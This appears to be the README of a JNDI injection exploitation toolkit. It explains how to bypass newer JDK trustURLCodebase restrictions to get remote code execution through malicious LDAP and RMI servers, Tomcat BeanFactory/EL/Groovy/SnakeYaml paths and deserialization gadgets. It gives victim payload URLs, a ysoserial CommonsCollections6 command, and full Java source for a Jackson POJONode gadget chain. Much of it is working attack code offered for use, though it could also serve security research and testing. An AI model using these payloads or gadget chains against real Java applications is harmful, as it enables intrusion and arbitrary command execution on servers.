# JNDI 注入利用方法

高版本JDK在RMI和LDAP的trustURLCodebase都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制。
所以修复后的JDK版本无法在不修改trustURLCodebase的情况下通过远程加载ObjectFactory类的方式去执行Java代码。
虽然无法再使用远程加载类，但绕过限制的方法也随之出现。目前公开常用的利用方法是通过Tomcat的org.apache.naming.factory.BeanFactory 工厂类去调用 javax.el.ELProcessor#eval方法或groovy.lang.GroovyShell#evaluate方法，还有通过LDAP的 javaSerializedData反序列化gadget。

# HackerLDAPRefServer
JNDI注入利用服务，LDAP server利用方法。
在jdk低于Oracle JDK 11.0.1、8u191、7u201、6u211时，可通过该方法远程加载Object Factory类，从而加载恶意类利用。

使用方法：
低版本jdk中直接启动该server,然后在victim发送payload`ldap://ip:port/Evil`来连接就行。

# HackerLDAPSerServer
将 gadget生成的payload通过LDAP的 javaSerializedData直接发给来连接的客户端，让客户端来完成反序列化的动作，这种方式将JNDI注入转化成了本地的反序列化问题。

使用方式：
1. 按下面修改server端需要发送的反序列化字符串:
将`e.addAttribute("javaSerializedData",Base64.decode("payload")`中的payload使用ysoserial工具生成然后进行替换,如
`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'calc'|base64`
2. 启动HackerLDAPSerServer
3. 发送payload: `ldap://ip:port/Evil`

# HackerRMIRefServer
tomcat<8.5.78的版本中可以使用 org.apache.naming.factory.BeanFactory工厂类去调用 javax.el.ELProcessor#eval方法或groovy.lang.GroovyShell#evaluate方法。需要同时存在Grovy、SnakeYaml、ELProcessor。

使用方法:
1. 修改Constants中的cmd为要执行的命令
2. 选择合适的payload： 选择yaml时需要开启httpserver.bat
```shell
rmi://ip:port/execByEL
rmi://ip:port/execByGroovyClassLoader
rmi://ip:port/execByGroovyShell
rmi://ip:port/execByYaml
```

# tomcat高版本BeanFactory的forceString不可用时的替代方案
使用ldap-->原生反序列化-->jackson-->RCE:
```java
@Dependencies({"jackson:jackson:2.13.4"})
@Authors({ Authors.PWNTESTER })
public class Jackson extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // inert chain for setup
        POJONode pojoNode = new POJONode(templates);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, pojoNode);
        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson.class, args);
        String command = "calc";
        final Object templates = Gadgets.createTemplatesImpl(command);
        // inert chain for setup
        POJONode pojoNode = new POJONode(templates);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        // 原生反序列化+jackson中，由于BaseJsonNode中存在writeReplace方法而直接触发到serialize，从而无法正常的进行序列化，通过java反序列化中的缓存机制，找到POJONode对应的ObjectStreamClass，
//        通过反射将其writeReplaceMethod变量设为null，这样在序列化时就不会调用到BaseJsonNode的writeReplace方法，从而可以正常构造出数据，并且不会影响反序列化。
        ObjectStreamClass objectStreamClass = ObjectStreamClass.lookup(POJONode.class);
        Field field = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
        field.setAccessible(true);
        field.set(objectStreamClass,null);

        new ObjectOutputStream(baos).writeObject(pojoNode);
        baos.flush();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        new ObjectInputStream(bais).readObject();
    }
}
```

# 参考
* [探索高版本JDK下JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
* [如何绕过高版本 JDK 的限制进行 JNDI 注入利用](https://paper.seebug.org/942/)
